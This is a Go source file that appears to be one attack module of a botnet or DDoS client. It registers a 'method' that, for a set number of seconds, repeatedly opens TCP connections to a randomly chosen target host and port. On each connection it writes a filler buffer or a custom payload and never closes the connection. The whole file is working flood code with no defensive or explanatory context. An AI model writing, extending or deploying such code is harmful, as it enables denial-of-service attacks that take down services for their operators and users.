package methodImpl

import (
	"client/core/modules/methods"
	"fmt"
	"net"
	"time"
)

func init() {
	methods.Make(&methods.Method{
		Id: 3,
		Executor: func(targets []string, port int, duration int, flags map[int]interface{}) error {
			start := time.Now()
			addr := fmt.Sprintf("%s:%d", randomChoice(targets), port)

			size, exists := flags[methods.FlagSize]
			if !exists {
				size = 1024
			}

			payload, exists := flags[methods.FlagPayload]
			if !exists {
				payload = ""
			}

			for time.Since(start) < time.Duration(duration)*time.Second {
				buf := make([]byte, size.(int))
				if len(payload.(string)) > 1 {
					buf = []byte(payload.(string))
				}

				conn, err := net.Dial("tcp", addr)
				if err != nil {
					continue
				}

				conn.Write(buf)
			}
			return nil
		},
	})
}
